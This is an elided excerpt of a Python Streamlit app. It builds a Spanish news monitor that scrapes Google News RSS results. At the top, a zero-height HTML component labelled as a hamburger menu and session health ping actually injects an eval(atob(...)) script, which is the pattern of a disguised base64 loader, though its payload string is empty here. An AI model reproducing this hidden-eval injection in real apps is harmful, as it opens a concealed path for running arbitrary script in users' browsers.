...
# Mobile hamburger menu + session health ping
import streamlit.components.v1 as _hb_comp
_hb_comp.html(
    '<script>eval(atob(""))</script>',
    height=0
)
...
if _nav == "monitor":
    ...
    def _fetch_monitor_news(query):
        ...
        from email.utils import parsedate_to_datetime as _pdd
        _q = _upm.quote(query)
        _url = f"https://news.google.com/rss/search?q={_q}&hl=es&gl=ES&ceid=ES:es"
        try:
            _r = _req_app.get(_url, headers={"User-Agent":"Mozilla/5.0"}, timeout=15)
            if _r.status_code != 200: return []
            _items = _rem.findall(r"<item>(.*?)</item>", _r.text, _rem.DOTALL)
            _now = _dtm.now(_tzm.utc)
            _arts = []
            for _it in _items[:30]:
                _t = _rem.search(r"<title>(.*?)</title>", _it)
                _l = _rem.search(r"<link>(.*?)</link>", _it)
                _s = _rem.search(r"<source[^>]*>(.*?)</source>", _it)
                _p = _rem.search(r"<pubDate>(.*?)</pubDate>", _it)
                if not _t: continue
                _ago = ""
                try:
                    _pdt = _pdd(_p.group(1).strip() if _p else "")
                    _dm = int((_now - _pdt).total_seconds() / 60)
                    if _dm < 60: _ago = f"hace {_dm}min"
                    elif _dm < 1440: _ago = _pdt.strftime("%H:%M")
                    else: _ago = f"hace {_dm//1440}d"
                except: pass
                _arts.append({"title": _t.group(1).strip()[:160],
                              "url": _l.group(1).strip() if _l else "#",
                              "src": _s.group(1).strip() if _s else "",
                              "ago": _ago})
            return _arts
        except: return []
